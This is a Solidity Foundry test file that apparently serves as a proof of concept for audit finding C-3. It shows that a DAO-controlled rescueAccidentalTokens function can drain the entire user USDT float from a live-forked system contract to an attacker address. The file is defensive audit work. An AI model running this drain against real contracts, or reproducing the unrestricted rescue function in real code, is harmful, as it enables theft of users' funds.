// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../BaseFork.t.sol";

/// @title RescueDrainTest -- PoC for AUDIT finding C-3
/// @notice `rescueAccidentalTokens` blocks only `projectToken`. The DAO
///         multisig can drain any other ERC20 -- including the in-flight
///         user USDT float held on the system contract -- with a single call.
///         No time-lock, no destination allowlist, no per-tx cap.
contract RescueDrainTest is BaseForkSetup {

    function test_C3_dao_can_drain_user_usdt_from_live_system() public {
        address daoCtrl = system.DAOMultisigController();
        assertEq(daoCtrl, DAO, "DAO controller drifted from documented value");

        uint256 systemUsdtBefore = IERC20(USDT).balanceOf(SYSTEM);
        emit log_named_uint("[live] system USDT float at fork block (wei)", systemUsdtBefore);
        emit log_named_string("[live] system USDT float (USDT)", _toUsdt(systemUsdtBefore));

        // Simulate a freshly-arrived float if the live block has none.
        if (systemUsdtBefore < 1_000 * WAD) {
            _dealUsdt(SYSTEM, 1_000 * WAD);
        }
        uint256 floatNow = IERC20(USDT).balanceOf(SYSTEM);
        assertGt(floatNow, 0, "no USDT float to drain");

        uint256 attackerBefore = IERC20(USDT).balanceOf(attacker);

        // The "compromised DAO" calls the rescue function.
        vm.prank(daoCtrl);
        system.rescueAccidentalTokens(USDT, attacker, floatNow);

        uint256 attackerAfter = IERC20(USDT).balanceOf(attacker);
        uint256 systemAfter   = IERC20(USDT).balanceOf(SYSTEM);

        emit log_named_string("USDT moved out of system to attacker", _toUsdt(attackerAfter - attackerBefore));
        emit log_named_uint("system USDT remaining after drain", systemAfter);

        assertEq(systemAfter, 0, "PoC: system should be drained empty");
        assertEq(attackerAfter - attackerBefore, floatNow, "attacker should receive full float");
    }

    function test_C3_project_token_rescue_still_blocked() public {
        address daoCtrl = system.DAOMultisigController();
        vm.prank(daoCtrl);
        vm.expectRevert(); // Err_CannotDrainRewardTokens
        system.rescueAccidentalTokens(TOKEN, attacker, 1);
    }
}
